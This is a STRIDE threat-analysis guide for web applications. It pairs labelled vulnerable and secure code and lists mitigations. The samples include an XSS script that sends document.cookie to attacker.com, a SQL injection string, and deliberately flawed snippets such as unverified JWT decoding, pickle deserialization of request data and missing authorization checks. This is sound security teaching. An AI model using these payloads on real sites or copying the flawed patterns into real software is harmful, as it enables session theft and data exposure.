# Detailed Threat Analysis by Category

This document provides in-depth analysis of each STRIDE threat category with real-world examples, attack vectors, and mitigation strategies.

---

## 🔴 Spoofing Identity

**Definition:** An attack where an attacker pretends to be something or someone they are not.

### Threats

#### 1. Credential Stuffing / Brute Force
- **Risk Level:** CRITICAL
- **Attack Vector:** Automated login attempts using leaked credentials
- **Prerequisites:** Valid email/username list, automation tools
- **Exploitation Time:** Minutes to hours
- **Detection:** Multiple failed login attempts from single IP

**Mitigation:**
```
✅ Rate limiting (5 attempts per minute per IP)
✅ Account lockout (after 10 failed attempts)
✅ Progressive delays (exponential backoff)
✅ CAPTCHA after 3 failed attempts
✅ Multi-factor authentication (MFA)
✅ Passwordless authentication (passkeys, WebAuthn)
✅ Monitor for suspicious patterns
```

#### 2. Session Hijacking
- **Risk Level:** HIGH
- **Attack Vector:** Stealing session cookie via XSS, MITM, or network sniffing
- **Prerequisites:** Unencrypted connection OR weak session cookie configuration
- **Impact:** Attacker gains full user access

**Mitigation:**
```
✅ HttpOnly flag (prevent JS access to cookies)
✅ Secure flag (HTTPS only)
✅ SameSite=Lax or Strict (CSRF protection)
✅ Short session lifetime (15-30 minutes)
✅ Session invalidation on logout
✅ Regenerate session ID after login
✅ Use TLS 1.2+
```

#### 3. IP Spoofing
- **Risk Level:** MEDIUM
- **Attack Vector:** Forging source IP address
- **Prevention:** Mostly network-level (outside application scope)

**Mitigation:**
```
✅ Network-level: Ingress filtering (BCP 38)
✅ Reverse DNS validation
✅ Rate limiting per IP
✅ Anomaly detection
```

#### 4. DNS Hijacking / Phishing
- **Risk Level:** HIGH
- **Attack Vector:** Redirecting users to fake domain
- **Prerequisites:** Social engineering, compromised DNS

**Mitigation:**
```
✅ DNSSEC (DNS Security Extensions)
✅ DMARC, SPF, DKIM (email authentication)
✅ HSTS (force HTTPS)
✅ Certificate pinning
✅ Security awareness training
```

---

## 🔴 Tampering with Data

**Definition:** Unauthorized modification of data, code, or system state.

### Threats

#### 1. SQL Injection
- **Risk Level:** CRITICAL
- **Attack Vector:** Injecting malicious SQL through input fields
- **Prerequisites:** Dynamic SQL queries, insufficient input validation
- **Impact:** Data theft, deletion, or modification

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE email = '{user_input}'"
# Input: ' OR '1'='1
# Result: Returns all users
```

**Secure Code:**
```python
cursor.execute("SELECT * FROM users WHERE email = %s", (user_input,))
# Parameterized query prevents injection
```

**Mitigation:**
```
✅ Parameterized queries (prepared statements)
✅ Input validation (whitelist allowed characters)
✅ Input sanitization (escape special characters)
✅ Principle of least privilege (DB user permissions)
✅ Web Application Firewall (WAF)
✅ Regular security testing (SQLMap, Burp Suite)
```

#### 2. Parameter Tampering
- **Risk Level:** MEDIUM
- **Attack Vector:** Modifying URL/form parameters
- **Example:** Changing `user_id=5` to `user_id=10` to access other users' data

**Mitigation:**
```
✅ Sign/encrypt sensitive parameters
✅ Use POST instead of GET for sensitive data
✅ Validate all input server-side
✅ Use hidden fields with server-side validation
✅ Use JWT with signature
```

#### 3. Man-in-the-Middle (MITM)
- **Risk Level:** HIGH
- **Attack Vector:** Intercepting unencrypted network traffic
- **Prerequisites:** Network access, unencrypted connections

**Mitigation:**
```
✅ TLS 1.2+ for all communications
✅ HSTS headers (force HTTPS)
✅ Certificate pinning (mobile apps)
✅ Mutual TLS (mTLS) for backend services
✅ Perfect Forward Secrecy (PFS)
✅ Avoid public WiFi for sensitive operations
```

#### 4. Code Injection (XSS, Command Injection, etc.)
- **Risk Level:** HIGH
- **Attack Vector:** Injecting malicious code into application

**XSS Example:**
```html
<!-- Vulnerable -->
<p>User comment: {user_input}</p>

<!-- Attack -->
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie)
</script>
```

**Mitigation:**
```
✅ Input validation (whitelist allowed content)
✅ Output encoding (HTML, URL, JavaScript contexts)
✅ Content Security Policy (CSP) headers
✅ Use security libraries (DOMPurify, OWASP ESAPI)
✅ Avoid eval() and similar functions
```

---

## 🟡 Repudiation

**Definition:** Ability to deny performing an action without evidence to the contrary.

### Threats

#### 1. Lack of Audit Logging
- **Risk Level:** MEDIUM
- **Impact:** Cannot trace who performed actions, accountability issues

**Mitigation:**
```
✅ Log all security-relevant events
✅ Include timestamp, user ID, action, result, IP address
✅ Use immutable logs (append-only)
✅ Store logs securely and encrypted
✅ Long retention period (1-7 years)
✅ Regular audit log reviews
```

#### 2. Forgery of Digital Evidence
- **Risk Level:** MEDIUM
- **Attack:** Attacker modifies logs or transactions

**Mitigation:**
```
✅ Digital signatures on critical transactions
✅ Hash chains (each log entry includes hash of previous)
✅ Write-once storage for audit logs
✅ Cryptographic verification
✅ Non-repudiation tokens (timestamps + signatures)
```

#### 3. User Denies Transaction
- **Risk Level:** LOW
- **Example:** Customer denies making online purchase

**Mitigation:**
```
✅ Detailed transaction logging
✅ Digital signatures
✅ Transaction confirmation emails
✅ IP address logging
✅ User agent logging
✅ Payment provider records (credit card processor)
```

---

## 🔵 Information Disclosure

**Definition:** Unauthorized access to or exposure of sensitive information.

### Threats

#### 1. Unencrypted Data at Rest
- **Risk Level:** CRITICAL
- **Attack Vector:** Database breach, stolen backups
- **Impact:** Exposure of PII, payment info, credentials

**Vulnerable Storage:**
```python
# Passwords stored in plaintext
users_db = {
    "john": "password123",  # ❌ VULNERABLE
    "jane": "secure_pass"
}
```

**Secure Storage:**
```python
# Using Argon2 for password hashing
from argon2 import PasswordHasher
ph = PasswordHasher()
password_hash = ph.hash(password)  # ✅ SECURE

# Using AES-256 for data encryption
from cryptography.fernet import Fernet
cipher = Fernet(encryption_key)
encrypted_ssn = cipher.encrypt(ssn.encode())  # ✅ SECURE
```

**Mitigation:**
```
✅ Encrypt all sensitive data (AES-256)
✅ Hash passwords with strong algorithm (Argon2, bcrypt)
✅ Encrypt database at rest
✅ Encrypt backups
✅ Secure key management (AWS KMS, HashiCorp Vault)
✅ Tokenization of payment data
✅ Minimize data collection (data minimization principle)
```

#### 2. Weak Password Storage
- **Risk Level:** CRITICAL
- **Vulnerable:** Using weak hash functions (MD5, SHA1)
- **Vulnerable:** Storing passwords in plaintext or reversible encryption

**Comparison:**

| Algorithm | Security | Speed | Recommendation |
|-----------|----------|-------|-----------------|
| Plaintext | NONE | Fast | ❌ Never use |
| MD5 | Broken | Fast | ❌ Never use |
| SHA1 | Broken | Medium | ❌ Never use |
| SHA-256 | Good | Medium | ⚠️ With salt |
| bcrypt | Excellent | Slow | ✅ Recommended |
| Argon2 | Excellent | Slow | ✅ Recommended |

**Mitigation:**
```
✅ Use Argon2 or bcrypt for password hashing
✅ Add salt (random, unique per password)
✅ High iteration count (slows brute force)
✅ Hardware key stretching (GPU/ASIC resistant)
✅ Minimum password length (12+ characters)
✅ Enforce password complexity
✅ Regular password resets (optional, controversial)
```

#### 3. Unencrypted Data in Transit
- **Risk Level:** HIGH
- **Attack Vector:** Network sniffing on public WiFi, MITM

**Mitigation:**
```
✅ TLS 1.2+ for all connections
✅ HSTS headers (HTTP Strict-Transport-Security)
✅ Certificate pinning for mobile apps
✅ Avoid HTTP completely
✅ Perfect Forward Secrecy (PFS)
```

#### 4. Verbose Error Messages
- **Risk Level:** MEDIUM
- **Attack Vector:** Information leakage through error messages

**Vulnerable:**
```
❌ "User 'admin@example.com' not found in database"
❌ "Password incorrect for username: john"
❌ "SQL Error: Column 'credit_card' does not exist"
```

**Secure:**
```
✅ "Invalid username or password"
✅ "An error occurred. Please contact support."
✅ Log detailed errors server-side only
```

#### 5. Insecure Direct Object Reference (IDOR)
- **Risk Level:** HIGH
- **Attack Vector:** Accessing other users' data by manipulating IDs

**Vulnerable:**
```python
@app.route('/api/profile/<user_id>')
def get_profile(user_id):
    user = db.get_user(user_id)
    return user.data  # No authorization check!
    
# Attacker: /api/profile/1 → sees user 1's data
# Attacker: /api/profile/2 → sees user 2's data
```

**Secure:**
```python
@app.route('/api/profile/<user_id>')
@require_auth
def get_profile(user_id):
    current_user = get_current_user()
    
    if int(user_id) != current_user.id:  # Authorization check
        abort(403)
    
    user = db.get_user(user_id)
    return user.data
```

---

## 🟠 Denial of Service

**Definition:** Making a system or service unavailable to legitimate users.

### Threats

#### 1. Brute Force Login Attack
- **Risk Level:** HIGH
- **Attack Vector:** Automated password guessing
- **Derivative:** Credential stuffing (using leaked credentials)

**Mitigation:**
```
✅ Rate limiting (5 attempts per minute per IP)
✅ Progressive delays (1s, 2s, 4s, 8s...)
✅ Account lockout (temporary after 10 attempts)
✅ CAPTCHA after failed attempts
✅ MFA (requires second factor)
✅ Monitor for attack patterns
✅ Alerting on suspicious activity
```

**Implementation:**
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app=app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 attempts/minute/IP
def login():
    # ... login logic
    pass
```

#### 2. Distributed Denial of Service (DDoS)
- **Risk Level:** MEDIUM
- **Attack Vector:** Multiple sources sending overwhelming traffic
- **Mitigation (Network Level):** Outside application scope

**Application-Level Mitigation:**
```
✅ Connection limits
✅ Request timeouts
✅ Request queuing
✅ Resource limits (memory, CPU)
✅ Rate limiting per user/IP
✅ Graceful degradation
```

#### 3. Resource Exhaustion
- **Risk Level:** MEDIUM
- **Attack Vector:** Uploading large files, complex queries, memory leaks

**Mitigation:**
```
✅ File upload size limits
✅ Request timeout limits
✅ Database query timeouts
✅ Connection pooling
✅ Resource monitoring & alerts
✅ Auto-scaling (for cloud deployments)
✅ Circuit breakers (fail fast)
```

#### 4. Algorithmic Complexity Attack
- **Risk Level:** MEDIUM
- **Attack Vector:** Crafted inputs causing high CPU usage
- **Example:** Regex ReDoS (Regular Expression Denial of Service)

**Vulnerable Regex:**
```python
import re
# ReDoS vulnerable pattern
pattern = r'^(a+)+$'
text = 'a' * 50 + 'b'  # Takes exponential time to fail!
re.match(pattern, text)
```

**Mitigation:**
```
✅ Use simple regex patterns
✅ Timeout regex operations
✅ Avoid nested quantifiers
✅ Input validation (reject very long inputs)
✅ Use regex testing tools
```

---

## 🔴 Elevation of Privilege

**Definition:** Gaining unauthorized access to higher privilege levels.

### Threats

#### 1. Broken Access Control (Broken Authentication)
- **Risk Level:** CRITICAL
- **OWASP Top 10:** #1 ranked vulnerability
- **Attack Vector:** Bypassing authorization checks

**Vulnerable:**
```python
@app.route('/api/users', methods=['GET'])
def get_all_users():
    # No role check! Any user can access admin data
    return db.get_all_users()

# Attacker (regular user): GET /api/users → sees all users!
```

**Secure:**
```python
from functools import wraps

def require_admin(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not g.user or g.user.role != 'admin':
            audit_log(g.user.id if g.user else 'unknown', 
                     'UNAUTHORIZED_ACCESS', 'get_all_users', 'FAILED')
            abort(403)
        return f(*args, **kwargs)
    return decorated_function

@app.route('/api/users', methods=['GET'])
@require_auth
@require_admin
def get_all_users():
    audit_log(g.user.id, 'GET_ALL_USERS', 'users', 'SUCCESS')
    return db.get_all_users()
```

#### 2. Privilege Escalation via API
- **Risk Level:** HIGH
- **Attack Vector:** Manipulating API parameters or JWT claims

**Vulnerable JWT Handling:**
```python
import jwt

@app.route('/protected', methods=['GET'])
def protected():
    token = request.headers.get('Authorization').replace('Bearer ', '')
    
    # ❌ VULNERABLE: Trusting client-provided claims
    payload = jwt.decode(token, options={"verify_signature": False})
    
    if payload.get('role') == 'admin':
        return get_secret_data()
```

**Secure JWT Handling:**
```python
import jwt

@app.route('/protected', methods=['GET'])
def protected():
    token = request.headers.get('Authorization').replace('Bearer ', '')
    
    # ✅ SECURE: Verify signature and validate claims
    try:
        payload = jwt.decode(token, app.config['SECRET_KEY'], 
                           algorithms=['HS256'])
    except jwt.InvalidTokenError:
        abort(401)
    
    # Verify role against database (not client claims)
    user = db.get_user(payload['user_id'])
    if user.role != 'admin':
        abort(403)
    
    return get_secret_data()
```

#### 3. Insecure Direct Object Reference (Vertical)
- **Risk Level:** HIGH
- **Attack Vector:** Changing object reference to higher-privileged object

**Vulnerable:**
```python
@app.route('/api/documents/<doc_id>/delete', methods=['DELETE'])
def delete_document(doc_id):
    doc = db.get_document(doc_id)
    # No ownership check!
    db.delete(doc)
    return {'status': 'deleted'}
```

**Secure:**
```python
@app.route('/api/documents/<doc_id>/delete', methods=['DELETE'])
@require_auth
def delete_document(doc_id):
    doc = db.get_document(doc_id)
    current_user = get_current_user()
    
    # Verify ownership or admin role
    if doc.owner_id != current_user.id and current_user.role != 'admin':
        audit_log(current_user.id, 'UNAUTHORIZED_DELETE', doc_id, 'FAILED')
        abort(403)
    
    audit_log(current_user.id, 'DELETE_DOCUMENT', doc_id, 'SUCCESS')
    db.delete(doc)
    return {'status': 'deleted'}
```

#### 4. Insecure Deserialization
- **Risk Level:** CRITICAL
- **Attack Vector:** Executing arbitrary code during object deserialization

**Vulnerable Python:**
```python
import pickle

# ❌ NEVER use pickle for untrusted data!
data = request.data
user_obj = pickle.loads(data)  # Arbitrary code execution!
```

**Secure:**
```python
import json

# ✅ Use JSON for serialization
data = request.data
user_data = json.loads(data)  # Safe
user_obj = User(**user_data)  # Validated construction
```

---

## Summary Table

| Threat | Severity | Likelihood | Risk | Main Mitigation |
|--------|----------|------------|------|-----------------|
| **S** - Credential Stuffing | HIGH | HIGH | CRITICAL | Rate limiting, MFA, account lockout |
| **S** - Session Hijacking | HIGH | MEDIUM | HIGH | Secure cookies, TLS, session regeneration |
| **T** - SQL Injection | CRITICAL | MEDIUM | CRITICAL | Parameterized queries, input validation |
| **T** - Parameter Tampering | MEDIUM | MEDIUM | MEDIUM | Sign parameters, server-side validation |
| **T** - MITM Attack | HIGH | MEDIUM | HIGH | TLS 1.2+, HSTS, certificate pinning |
| **R** - Lack of Audit Logs | MEDIUM | LOW | LOW | Comprehensive logging, immutable storage |
| **I** - Unencrypted Data at Rest | CRITICAL | HIGH | CRITICAL | Encrypt all sensitive data (AES-256) |
| **I** - Weak Password Storage | CRITICAL | HIGH | CRITICAL | Argon2/bcrypt, salt, high iteration count |
| **I** - Unencrypted Data in Transit | HIGH | MEDIUM | HIGH | TLS 1.2+, HSTS |
| **I** - IDOR (Unauthorized Access) | HIGH | MEDIUM | HIGH | Authorization checks, ownership validation |
| **D** - Brute Force Login | HIGH | HIGH | CRITICAL | Rate limiting, CAPTCHA, account lockout |
| **D** - DDoS Attack | MEDIUM | MEDIUM | MEDIUM | Rate limiting, WAF, CDN, auto-scaling |
| **E** - Broken Access Control | CRITICAL | MEDIUM | CRITICAL | RBAC, authorization middleware, audit logs |
| **E** - Privilege Escalation | HIGH | LOW | MEDIUM | JWT verification, role-based checks |
| **E** - IDOR (Vertical) | HIGH | MEDIUM | HIGH | Ownership/role checks, authorization |
| **E** - Insecure Deserialization | CRITICAL | LOW | CRITICAL | Use JSON, avoid pickle/unserialize |

